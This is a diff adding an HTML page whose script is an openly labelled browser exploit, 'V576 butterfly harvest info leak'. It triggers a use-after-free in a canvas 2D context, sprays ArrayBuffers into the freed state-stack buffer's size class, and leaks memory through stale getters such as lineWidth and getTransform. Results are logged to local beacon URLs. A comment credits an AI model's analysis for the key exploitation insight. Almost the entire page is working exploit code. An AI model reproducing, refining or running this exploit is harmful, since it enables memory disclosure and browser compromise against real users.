@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V576</title></head>
+<body><pre id="out">V576 — butterfly harvest info leak</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,body){
+  var u='/beacon/V576-'+tag+'?d='+encodeURIComponent(String(body).slice(0,400))+'&t='+Date.now();
+  try{new Image().src=u;}catch(e){}
+  setTimeout(function(){try{new Image().src=u+'&r=2';}catch(e){}},200);
+  setTimeout(function(){try{new Image().src=u+'&r=3';}catch(e){}},500);
+}
+var f64=new Float64Array(1);
+var u32=new Uint32Array(f64.buffer);
+function dblHex(d){f64[0]=d;return'0x'+('00000000'+u32[1].toString(16)).slice(-8)+('00000000'+u32[0].toString(16)).slice(-8);}
+
+var P=new URLSearchParams(location.search);
+var NSAVES=+(P.get('saves')||'32');
+var NSPRAY=+(P.get('spray')||'500');
+var MODE=P.get('mode')||'dual';
+var BUFSIZE=+(P.get('bufsize')||'0');
+
+var vcap=1;while(vcap<NSAVES+1)vcap*=2;
+var BUF_A=vcap*400, BUF_B=vcap*448;
+if(!BUFSIZE) BUFSIZE=BUF_B;
+
+bk('BOOT','saves='+NSAVES+',spray='+NSPRAY+',mode='+MODE+',vcap='+vcap+',buf='+BUFSIZE);
+say('V576 mode='+MODE+' saves='+NSAVES+' spray='+NSPRAY);
+say('Vector cap='+vcap+' bufA='+BUF_A+' bufB='+BUF_B+' target='+BUFSIZE);
+
+/* ===== UAF with external stateStack =====
+   Key insight (Opus 5.5 analysis): lineWidth getter path is ALL non-virtual:
+     wrapped() → impl.lineWidth() → state() → m_stateStack.last()
+   state() = m_stateStack.last() = m_buffer[m_size-1].lineWidth
+   None of this touches vtable at +0.
+
+   After free: 768B context slot has bytes 0-7 corrupted (bmalloc free-list),
+   but m_stateStack at +112 is INTACT (m_buffer ptr + m_size + m_capacity).
+   m_canvas at +32 still points to live outerC → GC addOpaqueRoot safe
+   (hashes pointer, never dereferences).
+
+   Strategy: DON'T reclaim the 768B context. Instead spray ABs into the
+   stateStack BUFFER's size class (~28KB, completely different from 768B).
+   lineWidth reads through stale m_buffer → hits our AB data. */
+
+var innerCtx=null;
+function triggerUAF(){
+  var c=document.createElement('canvas');
+  c.width=1;c.height=1;
+  var d={};
+  Object.defineProperty(d,'alpha',{get:function(){
+    var ctx=c.getContext('2d');
+    innerCtx=ctx;
+    ctx.lineWidth=1337.1337;
+    for(var s=0;s<NSAVES;s++) ctx.save();
+    ctx.lineWidth=1337.1337;
+    return true;
+  }});
+  c.getContext('bitmaprenderer',d);
+  return c;
+}
+
+bk('PRE-UAF','triggering');
+var outerC=triggerUAF();
+bk('POST-UAF','ctx='+(innerCtx?'OK':'NULL'));
+
+/* === Immediately read freed memory — ZERO allocations between free and read === */
+var rawLW,rawOK=false;
+try{rawLW=innerCtx.lineWidth;rawOK=true;}catch(e){}
+if(rawOK){
+  bk('RAW-LW','val='+rawLW+',hex='+dblHex(rawLW));
+  say('RAW read (no spray): lineWidth='+rawLW+' hex='+dblHex(rawLW));
+  if(rawLW===1337.1337){bk('RAW-OK','original-intact');say('ORIGINAL VALUE INTACT in freed memory!');}
+  else{bk('RAW-DIFF','changed');say('Value changed from original');}
+
+  /* Read more inline getters at different State offsets */
+  try{var v=innerCtx.miterLimit;bk('RAW-ML','val='+v+',hex='+dblHex(v));say('RAW miterLimit='+v);}catch(e){bk('RAW-ML-X',e.name);}
+  try{var v=innerCtx.globalAlpha;bk('RAW-GA','val='+v+',hex='+dblHex(v));say('RAW globalAlpha='+v);}catch(e){bk('RAW-GA-X',e.name);}
+  try{var v=innerCtx.shadowOffsetX;bk('RAW-SOX','val='+v+',hex='+dblHex(v));}catch(e){bk('RAW-SOX-X',e.name);}
+  try{var v=innerCtx.shadowOffsetY;bk('RAW-SOY','val='+v+',hex='+dblHex(v));}catch(e){bk('RAW-SOY-X',e.name);}
+  try{var v=innerCtx.shadowBlur;bk('RAW-SB','val='+v+',hex='+dblHex(v));}catch(e){bk('RAW-SB-X',e.name);}
+  try{var v=innerCtx.lineDashOffset;bk('RAW-LDO','val='+v+',hex='+dblHex(v));}catch(e){bk('RAW-LDO-X',e.name);}
+}else{
+  bk('RAW-CRASH','lineWidth-failed-on-freed');
+  say('RAW read CRASHED on freed context');
+}
+
+if(MODE==='raw'){
+  bk('DONE','raw-only');
+  say('\nV576 raw-only complete.');
+}
+else if(MODE==='butterfly' || MODE==='dual'){
+  /* === Butterfly spray: ABs into stateStack buffer's size class === */
+  say('\n--- Butterfly spray ---');
+  var abs=[];
+  for(var i=0;i<NSPRAY;i++){
+    try{
+      var ab=new ArrayBuffer(BUFSIZE);
+      var dv=new Float64Array(ab);
+      for(var j=0;j<dv.length;j++) dv[j]=10000000+j;
+      abs.push(ab);
+    }catch(e){}
+  }
+  bk('BF-SPRAY','n='+abs.length+',size='+BUFSIZE);
+  say('Sprayed '+abs.length+' ABs of '+BUFSIZE+'B');
+
+  /* Read lineWidth again — should now follow stale m_buffer into AB data */
+  var bfLW,bfOK=false;
+  try{bfLW=innerCtx.lineWidth;bfOK=true;}catch(e){}
+  if(bfOK){
+    bk('BF-LW','val='+bfLW+',hex='+dblHex(bfLW));
+    say('POST-SPRAY lineWidth='+bfLW+' hex='+dblHex(bfLW));
+
+    if(bfLW>=10000000 && bfLW<30000000){
+      var slot=Math.round(bfLW-10000000);
+      var byteOff=slot*8;
+      bk('BF-HIT','slot='+slot+',byte='+byteOff);
+      say('*** AB HIT: byte offset '+byteOff+' (slot '+slot+') ***');
+      for(var off=0;off<=128;off+=8){
+        var ss=(byteOff-off)/NSAVES;
+        if(ss===Math.floor(ss)&&ss>=300&&ss<=600){
+          bk('BF-SIZEOF','lwOff='+off+',sizeof='+ss);
+          say('  sizeof(State)='+ss+', lineWidth@State+'+off);
+        }
+      }
+    }else if(bfLW===1337.1337){
+      bk('BF-MISS','original-spray-missed');
+      say('Original value — spray missed (wrong size class?)');
+      say('Try bufsize='+BUF_A+' or bufsize='+BUF_B+' or bufsize=32768');
+    }else if(bfLW===0){
+      bk('BF-ZERO','zero-init-or-decommit');
+      say('Zero — buffer was zeroed or decommitted+recommitted');
+    }else{
+      bk('BF-OTHER','val='+bfLW);
+      say('Unexpected value — check hex for pointer bits');
+    }
+
+    if(rawOK && bfLW!==rawLW){
+      bk('BF-CHANGED','raw='+rawLW+',post='+bfLW);
+      say('*** VALUE CHANGED: raw='+rawLW+' → post='+bfLW+' ***');
+    }
+
+    /* More inline getters */
+    try{var v=innerCtx.miterLimit;bk('BF-ML','val='+v+',hex='+dblHex(v));}catch(e){bk('BF-ML-X',e.name);}
+    try{var v=innerCtx.globalAlpha;bk('BF-GA','val='+v+',hex='+dblHex(v));}catch(e){bk('BF-GA-X',e.name);}
+    try{var v=innerCtx.shadowBlur;bk('BF-SB','val='+v+',hex='+dblHex(v));}catch(e){bk('BF-SB-X',e.name);}
+    try{
+      var t=innerCtx.getTransform();
+      bk('BF-XF','a='+dblHex(t.a)+',b='+dblHex(t.b)+',c='+dblHex(t.c)+',d='+dblHex(t.d)+',e='+dblHex(t.e)+',f='+dblHex(t.f));
+      say('transform: a='+t.a+' b='+t.b+' c='+t.c);
+    }catch(e){bk('BF-XF-X',e.name);say('getTransform crashed: '+e.name);}
+  }else{
+    bk('BF-CRASH','lineWidth-failed-after-spray');
+    say('CRASH reading lineWidth after butterfly spray');
+  }
+
+  /* === Sweep: try alternate buffer sizes === */
+  if(bfOK && (bfLW===1337.1337 || bfLW===0)){
+    say('\n--- Buffer size sweep ---');
+    var alts=[BUF_A,BUF_B,32768,24576,20480,16384];
+    for(var ai=0;ai<alts.length;ai++){
+      if(alts[ai]===BUFSIZE) continue;
+      var altAbs=[];
+      for(var i=0;i<100;i++){
+        try{
+          var ab=new ArrayBuffer(alts[ai]);
+          var dv=new Float64Array(ab);
+          for(var j=0;j<dv.length;j++) dv[j]=20000000+ai*100000+j;
+          altAbs.push(ab);
+        }catch(e){}
+      }
+      var altLW;
+      try{altLW=innerCtx.lineWidth;}catch(e){altLW='CRASH';}
+      bk('BF-ALT','size='+alts[ai]+',n='+altAbs.length+',lw='+altLW);
+      say('  bufsize='+alts[ai]+': lw='+altLW);
+      if(typeof altLW==='number' && altLW>=20000000){
+        var aslot=Math.round(altLW-20000000-ai*100000);
+        bk('BF-ALT-HIT','size='+alts[ai]+',slot='+aslot+',byte='+(aslot*8));
+        say('  *** ALT HIT at bufsize='+alts[ai]+' byte='+(aslot*8)+' ***');
+        break;
+      }
+    }
+  }
+
+  bk('DONE','mode='+MODE);
+  say('\nV576 complete.');
+}
+</script>
+</body></html>
